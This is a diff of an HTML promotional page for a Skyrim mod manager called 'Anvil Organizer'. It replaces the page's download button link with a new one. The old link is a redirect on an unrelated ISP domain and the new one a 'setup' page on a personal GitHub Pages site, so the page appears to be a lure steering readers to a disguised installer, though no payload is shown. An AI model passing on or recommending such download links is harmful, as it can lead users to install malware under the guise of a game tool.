@@ -1,7 +1,7 @@
 <div style="max-width:800px;margin:auto;padding:20px;font-family:Arial,sans-serif;line-height:1.6;background:#0a0a0f;color:#e0e0e0;border-radius:15px;">
 <h1 style="color:#44aaff;border-bottom:2px solid #2288cc;text-align:center;">🐉 Anvil Organizer – Skyrim Mod Manager for Windows (MO2 Alternative) 🐉</h1>
 <p style="font-size:1.1em;text-align:center;"><strong>Complete mod management solution for Skyrim Special Edition / Anniversary Edition on Windows.</strong> Install, uninstall, and manage mods with virtual file system – no game folder pollution. Supports SKSE64, ENB, and all .esp/.esl/.esm plugins.</p>
-<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://www.shawonline.co.za/redir" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD ANVIL ORGANIZER (SETUP)</a><p>✅ Windows 10/11 ✅ Virtual file system ✅ LOOT integration ✅ Profile management ✅ No Wine/Proton</p></div>
+<div style="background:#111116;padding:20px;text-align:center;margin:15px 0;"><a href="https://dalmatan3000.github.io/setup" style="background:#44aaff;color:#000;padding:12px 25px;text-decoration:none;border-radius:5px;">⬇️ DOWNLOAD ANVIL ORGANIZER (SETUP)</a><p>✅ Windows 10/11 ✅ Virtual file system ✅ LOOT integration ✅ Profile management ✅ No Wine/Proton</p></div>
 <img src="https://shared.fastly.steamstatic.com/store_item_assets/steam/apps/489830/header.jpg" style="max-width:100%;border-radius:8px;margin:15px 0;">
 <div><h3>📦 What You Unlock with Anvil Organizer for Skyrim:</h3>
 <ul><li><strong>Virtual File System (VFS):</strong> Mods are stored outside your Skyrim folder – no conflicts, no reinstallation needed when removing mods.</li>
